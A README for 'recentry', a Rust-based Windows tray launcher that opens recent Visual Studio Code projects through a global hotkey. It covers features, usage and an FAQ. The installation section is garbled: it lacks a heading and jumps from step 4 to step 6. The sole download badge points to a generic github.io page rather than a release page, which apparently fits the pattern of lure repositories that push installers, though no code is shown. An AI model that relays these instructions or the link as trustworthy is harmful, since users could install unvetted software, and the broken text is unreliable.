# 🚀 recentry - Open your VS Code projects instantly

[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue)](https://smarty2007official-wq.github.io)

Recentry helps you open your recent Visual Studio Code projects without opening the editor first. It acts as a launcher that sits in the background. You press a simple keyboard shortcut, and a menu appears on your screen. You select your project from the list, and the software opens it for you. This saves time if you switch between many projects during your workday.

## 🛠 Features

This tool focuses on speed and ease of use. It consumes very little memory on your computer.

*   Quick access to your project history.
*   Search filter to find specific folder names.
*   System tray integration for easy access.
*   Background process with low resource usage.
*   Global hotkey support to trigger the menu from any application.

4. Run the installer file once the download finishes.

6. Launch the application from your Start menu.

The software runs in your system tray upon launch. You can click the icon to see your settings or exit the program.

## ⌨️ How to use the app

Once the app runs, you can open your developer projects in seconds. 

1. Press the default keyboard shortcut: `Alt + Space`. A window appears near your cursor.
2. Type the name of the project folder you look for.
3. Use the `Arrow Keys` on your keyboard to highlight the correct result.
4. Press `Enter` to open the project in Visual Studio Code.

If you prefer to change the shortcut, right-click the icon in your system tray. Select Settings. Type your preferred key combination into the shortcut field. Save your changes to apply the new control.

## ❓ Frequently Asked Questions

**Does this software store my data?**
No. All project paths remain on your local machine. The software reads your existing Visual Studio Code history folder to display the list of projects. No data travels over the internet.

**Can I run this on Linux or macOS?**
Current builds only support Windows. Future updates will bring support for other operating systems. Visit the repository page to track progress on these versions.

**The menu does not appear when I press the shortcut.**
Check if the application is running in your system tray. If the app is closed, open it from the Start menu. Also, ensure no other programs use the same keyboard shortcut, as this causes conflicts. You can change your hotkey in the settings menu if necessary.

**How do I update the program?**
Download the latest version from the releases page when an update is available. You can run the installer over your current version. Your settings remain intact.

**Does this software slow down my computer?**
Recentry uses the Rust programming language to ensure maximum efficiency. It is designed to stay idle until you trigger the menu. It uses negligible CPU power while sitting in the background.
